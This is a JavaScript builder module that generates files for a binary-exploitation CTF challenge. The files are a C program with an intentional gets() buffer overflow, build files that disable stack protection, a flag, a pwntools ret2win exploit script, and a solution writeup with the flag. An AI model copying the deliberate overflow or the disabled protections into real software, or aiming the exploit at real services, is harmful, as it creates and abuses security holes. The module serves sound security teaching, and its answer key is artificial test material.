/**
 * Binary Exploitation (Pwn) — category-specific builder.
 * Phase 1: returns mock challenge files.
 */
export default {
  categoryId: 'pwn',

  async build(spec) {
    const name = spec.challengeName || spec.challenge_name || 'Pwn Challenge';
    const flag = spec.flags?.[0] || 'Exploit3rs{pwn_d3f4ult}';
    const narrative = spec.narrative || 'Exploit the binary vulnerability to capture the flag.';
    const difficulty = spec.difficulty || 'medium';
    const points = spec.points || 300;

    return [
      {
        path: 'vuln.c',
        language: 'c',
        content: `/*
 * ${name} - Vulnerable Binary
 * Compile: gcc -o vuln vuln.c -fno-stack-protector -no-pie
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    char flag[64];
    FILE *f = fopen("flag.txt", "r");
    if (f) {
        fgets(flag, sizeof(flag), f);
        printf("Congratulations! %s\\n", flag);
        fclose(f);
    }
}

void vuln() {
    char buf[64];
    printf("Enter your name: ");
    gets(buf);  // Classic buffer overflow
    printf("Hello, %s!\\n", buf);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    printf("=== ${name} ===\\n");
    vuln();
    return 0;
}`,
      },
      {
        path: 'Makefile',
        language: 'makefile',
        content: `CC=gcc
CFLAGS=-fno-stack-protector -no-pie -z execstack
TARGET=vuln

all: $(TARGET)

$(TARGET): vuln.c
\t$(CC) $(CFLAGS) -o $(TARGET) vuln.c

clean:
\trm -f $(TARGET)`,
      },
      {
        path: 'Dockerfile',
        language: 'dockerfile',
        content: `FROM ubuntu:22.04
RUN apt-get update && apt-get install -y gcc socat && rm -rf /var/lib/apt/lists/*
WORKDIR /challenge
COPY vuln.c Makefile flag.txt ./
RUN make
RUN chmod +x vuln
EXPOSE 9999
CMD ["socat", "TCP-LISTEN:9999,reuseaddr,fork", "EXEC:./vuln"]`,
      },
      {
        path: 'flag.txt',
        language: 'text',
        content: flag,
      },
      {
        path: 'exploit.py',
        language: 'python',
        content: `#!/usr/bin/env python3
"""Exploit for ${name}"""
from pwn import *

TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

elf = ELF("./vuln")
win_addr = elf.symbols["win"]

print(f"[*] win() at {hex(win_addr)}")
print(f"[*] Connecting to {TARGET}:{PORT}")

r = remote(TARGET, PORT)
payload = b"A" * 72 + p64(win_addr)
r.sendlineafter(b"name: ", payload)
r.interactive()`,
      },
      {
        path: 'writeup.md',
        language: 'markdown',
        content: `# ${name} - Writeup

## Challenge Description
${narrative}

## Difficulty
${difficulty} (${points} points)

## Solution
1. Analyze the binary — identify the buffer overflow in \`vuln()\`
2. Find the \`win()\` function address using \`objdump\` or \`pwntools\`
3. Calculate offset to return address (72 bytes)
4. Craft payload: padding + win() address
5. Send payload to overwrite return address and redirect execution

## Flag
\`${flag}\``,
      },
    ];
  },
};
